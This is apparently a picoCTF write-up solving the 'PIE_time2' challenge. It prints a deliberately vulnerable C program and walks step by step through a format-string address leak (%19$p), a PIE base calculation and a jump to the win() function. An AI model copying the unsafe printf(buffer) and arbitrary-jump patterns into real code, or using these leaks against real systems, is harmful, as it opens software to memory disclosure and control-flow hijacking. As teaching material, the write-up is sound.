# PIE_time2 Challenge Solution

## Challenge Overview

This challenge involves a Position Independent Executable (PIE) binary that has a format string vulnerability and allows jumping to arbitrary memory addresses. The goal is to call the `win()` function to get the flag, but since PIE randomizes the base address of the program, we need to leak an address first and calculate the win function location.

## Understanding the Code

```c
// filepath: /home/richie/workspace/pico/final_writeoff/binary_exploiration/PIE_time2[medium]/vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name: ");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
  return;
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

## Vulnerabilities

There are two key vulnerabilities in this code:

1. **Format String Vulnerability**: 
   ```c
   printf(buffer);  // The user input is directly passed to printf
   ```

2. **Arbitrary Jump**:
   ```c
   void (*foo)(void) = (void (*)())val;
   foo();  // Jumps to any address we provide
   ```

## Exploitation Steps

### 1. Identify the Offsets

We need to identify important offsets:
- The `win()` function is at some offset from the program base
- The label `main_1441` is at offset 0x1441 from the base

### 2. Leak an Address Using Format String

We can use the format string vulnerability to leak an address from the stack. Specifically, `%19$p` will print the return address for the `main` function, which corresponds to the `main_1441` label.

```
Enter your name: %19$p
0x55dcded5a441  // Example leaked address
```

### 3. Calculate the Base Address

We know that the leaked address (0x55dcded5a441 in this example) corresponds to the `main_1441` label, which is at offset 0x1441 from the base address.

```
base_address = leaked_address - 0x1441
base_address = 0x55dcded5a441 - 0x1441 = 0x55dcded59000
```

### 4. Calculate Win Function Address

The `win()` function is at offset 0x136a from the program base (you would determine this through binary analysis or from the objdump).

```
win_address = base_address + 0x136a
win_address = 0x55dcded59000 + 0x136a = 0x55dcded5a36a
```

### 5. Jump to Win Function

When prompted for an address to jump to, we provide the calculated address of the `win()` function:

```
enter the address to jump to, ex => 0x12345: 0x55dcded5a36a
```

The program then executes the `win()` function, which prints the flag.

## Full Exploit Process

1. Run the program
2. Enter `%19$p` as the name to leak a stack address
3. Calculate:
   - Program base address = leaked_address - 0x1441
   - Win function address = base_address + 0x136a
4. Enter the calculated win function address
5. Get the flag!

## Example Execution

```
Enter your name: %19$p
0x55dcded5a441 enter the address to jump to, ex => 0x12345: 0x55dcded5a36a
You won!
picoCTF{flag_contents_here}
```
